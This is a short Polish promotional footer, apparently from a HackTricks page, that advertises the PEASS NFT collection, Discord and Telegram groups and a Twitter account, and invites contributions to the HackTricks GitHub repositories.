* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>
